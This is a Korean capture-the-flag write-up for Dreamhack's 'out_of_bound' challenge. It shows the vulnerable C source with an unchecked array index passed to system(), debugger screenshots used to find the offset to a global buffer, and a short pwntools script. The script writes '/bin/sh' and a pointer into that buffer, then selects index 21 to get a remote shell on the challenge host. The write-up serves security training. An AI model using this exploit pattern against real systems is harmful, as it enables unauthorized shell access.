out_of_bound 라이트업
============

## 코드 분석


```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = {
    "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

* name 전역 변수에 16바이트까지 원하는 값을 넣을 수 있다.
* cat, ls, id, ps, file ./oob의 5개의 명령어를 system 함수를 통해 셸에서 실행시킨 결과를 얻을 수 있다.
* oob 취약점을 통해 command [idx]에 "/bin/sh\x00"이 들어가게 해야한다.


## 익스플로잇

* command[idx]의 값이 cat, ls, id, ps, file ./oob 5개 중 하나로 정해지려면 idx에는 0에서 4부터의 값만 들어가야 한다.
* idx의 범위에 대한 검사를 진행하지 않기 때문에 음수 값을 집어넣어 command 주소보다 더 앞의 주소를 가져오거나
* 4보다 큰 값을 집어넣어 file ./oob 가 저장된 주소보다 더 뒤의 주소를 가져올 수 있다.


### command 와 name 의 주소 확인

<img width="770" height="107" alt="image" src="https://github.com/user-attachments/assets/96585d95-4565-4f36-96e4-da7468f14d4f" />

두 주소는 76바이트만큼 차이가 난다.   

여기서 command[19] = 0x804a060 + 76 이 되어 name 주소에 저장되어 있는 값을 가리킨다. 

-----

### system 함수에 인자 전달

<img width="747" height="185" alt="image" src="https://github.com/user-attachments/assets/307fe239-21a0-47a3-a942-0f0a7952f013" />

system 함수 호출 직전에 bp걸고 진행하면 

<img width="1073" height="306" alt="image" src="https://github.com/user-attachments/assets/4a24489d-1b13-44ef-ac80-8816dfdca7d1" />

system 함수에 인자로 eax 레지스터의 값인 "/bin" 이 들어간다. eax에는 name의 주소가 들어가야 한다.


-----

### payload 작성

```python
from pwn import *

p = remote("host1.dreamhack.games", 19448)

payload = b"/bin/sh\x00" + p32(0x804a0ac)

p.sendline(payload)
p.sendline(b"21")

p.interactive()
```

## 실행 결과

<img width="1186" height="288" alt="image" src="https://github.com/user-attachments/assets/1fa13bfc-b3bc-4db3-9bee-86c500ea75cc" />

